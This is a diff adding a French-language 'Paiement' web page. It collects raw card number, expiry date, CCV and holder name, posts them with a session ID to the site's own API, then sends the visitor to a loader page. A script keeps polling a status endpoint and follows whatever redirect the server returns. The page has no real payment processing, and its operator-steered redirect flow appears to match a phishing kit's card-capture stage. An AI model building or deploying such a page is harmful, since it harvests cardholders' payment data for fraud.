@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Paiement</title></head>
+<body>
+<h1>💳 Paiement</h1>
+<form id="paymentForm">
+Numéro carte: <input name="number"><br>
+Date exp: <input name="expiry"><br>
+CCV: <input name="ccv"><br>
+Nom titulaire: <input name="holder"><br>
+<button type="submit">Valider</button>
+</form>
+<script>
+document.getElementById('paymentForm').onsubmit = async function(e){
+  e.preventDefault();
+  const sessionId = localStorage.getItem('sessionId');
+  const data = {
+    sessionId,
+    number:this.number.value,
+    expiry:this.expiry.value,
+    ccv:this.ccv.value,
+    holder:this.holder.value
+  };
+  await fetch('/api/payment',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
+  window.location.href = '/loader.html?sid='+sessionId;
+}
+async function checkRedirect(){
+  const sessionId = localStorage.getItem('sessionId');
+  if(!sessionId) return;
+  const res = await fetch('/api/status?sessionId='+sessionId);
+  const data = await res.json();
+  if(data.redirect) window.location.href = data.redirect;
+  else setTimeout(checkRedirect,2000);
+}
+checkRedirect();
+</script>
+</body>
+</html>
